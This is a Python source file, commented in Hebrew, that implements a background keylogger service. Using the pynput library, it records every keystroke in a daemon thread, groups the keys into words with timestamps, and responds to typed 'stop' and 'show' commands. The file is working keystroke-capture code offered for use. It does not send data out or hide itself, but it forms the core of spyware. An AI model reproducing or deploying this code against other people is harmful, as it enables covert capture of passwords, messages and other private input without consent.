import threading
from datetime import datetime
from typing import List
from pynput import keyboard
from IKeyLogger import IKeyLogger

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.stop_keylogger = threading.Event()  # Event שמאפשר לעצור את הלוגגר
        self.logged_keys = []
        self.current_word = ""
        self.listener_thread = threading.Thread(target=self.start_logging, daemon=True)  # מאזין כרקע
        self.listener_thread.start()  # מפעיל את ההאזנה

    def start_logging(self) -> None:
        """הפעלת האזנה ללחיצות מקשים ברקע"""
        print("start logging")
        with keyboard.Listener(on_press=self.key_pressed) as listener:
            self.listener = listener
            self.listener.join()  # מאזין כל עוד התוכנית רצה

    def stop_logging(self) -> None:
        """עצירת האזנה"""
        print("stop logging")
        self.stop_keylogger.set()  # סימון העצירה
        if hasattr(self, "listener"):
            self.listener.stop()  # עצירה נקייה של המאזין

    def get_logged_keys(self) -> List[str]:
        """החזרת הנתונים שנקלטו"""
        print("get_logged_keys")
        return self.logged_keys

    def clear_logged_keys(self):
        """ניקוי הנתונים שנקלטו"""
        print("clear_logged_keys")
        self.logged_keys.clear()

    def key_pressed(self, key) -> bool:
        """פעולה כאשר מקש נלחץ"""
        if self.stop_keylogger.is_set():
            return False  # מפסיק אם יש בקשה לעצור

        if hasattr(key, 'char') and key.char:
            self.current_word += key.char
            if self.current_word == "stop":
                self.stop_logging()
                return False
            if self.current_word == "show":
                print("Logged Keys:", self.logged_keys)
                self.current_word = ""

        elif self.current_word and key == keyboard.Key.space:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.logged_keys.append([timestamp, self.current_word])
            self.current_word = ""

if __name__ == '__main__':
    kl = KeyLoggerService()
    try:
        while True:
            pass  # משאיר את התוכנית רצה
    except KeyboardInterrupt:
        kl.stop_logging()
        print("KeyLogger stopped.")
